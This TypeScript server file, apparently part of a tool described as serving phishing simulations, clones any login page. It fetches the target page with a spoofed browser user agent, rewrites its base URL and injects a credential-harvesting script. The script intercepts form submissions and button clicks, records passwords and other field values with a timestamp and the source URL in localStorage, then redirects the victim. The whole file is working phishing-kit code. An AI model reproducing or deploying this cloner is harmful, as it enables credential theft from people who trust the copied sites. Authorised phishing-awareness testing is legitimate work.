
'use server';
/**
 * @fileOverview A server-side utility for cloning a web page for phishing simulations.
 *
 * - cloneLoginPage - Fetches a URL's HTML, injects a credential harvester script, and returns the modified content.
 * - PageClonerInput - The input type for the cloneLoginPage function.
 * - PageClonerOutput - The return type for the cloneLoginPage function.
 */

import {z} from 'zod';

const PageClonerInputSchema = z.object({
  targetUrl: z.string().url('A valid target URL is required.'),
  redirectUrl: z.string().url('A valid URL to redirect to after submission is required.'),
});
export type PageClonerInput = z.infer<typeof PageClonerInputSchema>;

const PageClonerOutputSchema = z.object({
  htmlContent: z.string().describe('The full HTML content of the generated login page.'),
});
export type PageClonerOutput = z.infer<typeof PageClonerOutputSchema>;


const getHarvesterScript = (redirectUrl: string) => `
<script>
  function captureAndRedirect(formElement) {
    if (!(formElement instanceof HTMLFormElement)) {
      console.warn('Capture target is not a form element.');
      window.location.href = '${redirectUrl}';
      return;
    }
    
    let credentials = {};
    const inputs = formElement.querySelectorAll('input');
    let capturedSomething = false;

    inputs.forEach((input, index) => {
      // Prioritize capturing password fields
      if (input.type === 'password' && input.value) {
        credentials['password'] = input.value;
        capturedSomething = true;
      } 
      // Capture other text-like fields
      else if (input.type !== 'hidden' && input.type !== 'submit' && input.type !== 'button' && input.type !== 'checkbox' && input.type !== 'radio' && input.value) {
        // Use a generic key if name is missing, but prefer name
        const key = input.name || 'input_' + index;
        // Avoid overwriting an already found password field with a non-password field that also happens to be named 'password'
        if (!(key === 'password' && credentials['password'])) {
           credentials[key] = input.value;
           capturedSomething = true;
        }
      }
    });

    try {
      if (capturedSomething) {
        const entry = {
            ...credentials,
            source: window.location.href, // Add source for context
            timestamp: new Date().toISOString()
        };
        const storageKey = 'netra-captured-credentials';
        const storedCreds = localStorage.getItem(storageKey);
        const existingCreds = storedCreds ? JSON.parse(storedCreds) : [];
        const updatedCreds = [...existingCreds, entry];
        localStorage.setItem(storageKey, JSON.stringify(updatedCreds));
      }
    } catch (err) {
      console.error('Error saving credentials to localStorage:', err);
    }
    
    // Redirect after a very short delay to ensure storage operation completes.
    setTimeout(() => {
        window.location.href = '${redirectUrl}';
    }, 150);
  }

  // Listener for standard form submissions.
  document.addEventListener('submit', function(e) {
    const form = e.target;
    if(form instanceof HTMLFormElement) {
      e.preventDefault();
      e.stopPropagation();
      captureAndRedirect(form);
    }
  }, true);

  // Listener for clicks on buttons that might trigger a JS-based submission.
  document.addEventListener('click', function(e) {
    const target = e.target.closest('button, input[type="submit"]');

    if (target) {
        const form = target.closest('form');
        if (form) {
            e.preventDefault();
            e.stopPropagation();
            captureAndRedirect(form);
        }
    }
  }, true);
</script>
`;


export async function cloneLoginPage(input: PageClonerInput): Promise<PageClonerOutput> {
  const { targetUrl, redirectUrl } = PageClonerInputSchema.parse(input);

  try {
    const response = await fetch(targetUrl, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Language': 'en-US,en;q=0.9',
      },
    });

    if (!response.ok) {
      throw new Error(`Failed to fetch the target URL. Status: ${response.status}`);
    }

    let html = await response.text();

    // 1. Inject <base> tag to fix relative links for CSS, images, etc.
    const url = new URL(targetUrl);
    const baseTag = `<base href="${url.origin}">`;
    html = html.replace(/(<head[^>]*>)/, `$1${baseTag}`);

    // 2. Inject the credential harvester script before the closing body tag
    const script = getHarvesterScript(redirectUrl);
    html = html.replace(/<\/body>/, `${script}</body>`);

    return {
      htmlContent: html,
    };
  } catch (error) {
    console.error('Error cloning page:', error);
    if (error instanceof Error) {
        throw new Error(`Failed to clone page: ${error.message}`);
    }
    throw new Error('An unknown error occurred during page cloning.');
  }
}
